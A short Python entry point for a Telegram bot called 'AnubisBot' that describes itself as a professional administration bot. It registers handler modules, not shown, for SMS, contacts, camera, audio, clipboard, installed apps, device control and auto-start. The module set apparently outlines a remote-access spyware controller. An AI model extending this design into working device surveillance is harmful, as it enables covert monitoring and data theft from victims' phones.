import logging
from pyrogram import Client, filters
from config import API_ID, API_HASH, BOT_TOKEN
from utils import notifications, device_control, sms, contacts, apps, camera, audio, clipboard, auto_start

app = Client("anubis_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    await message.reply("¡Hola! Soy AnubisBot, tu bot de administración profesional.")

@app.on_message(filters.command("help") & filters.private)
async def help_command(client, message):
    help_text = """
    Comandos disponibles:
    /start - Iniciar el bot
    /help - Mostrar esta ayuda
    """
    await message.reply(help_text)

# Registering functionalities
notifications.register_handlers(app)
device_control.register_handlers(app)
sms.register_handlers(app)
contacts.register_handlers(app)
apps.register_handlers(app)
camera.register_handlers(app)
audio.register_handlers(app)
clipboard.register_handlers(app)
auto_start.register_handlers(app)

if __name__ == "__main__":
    app.run()
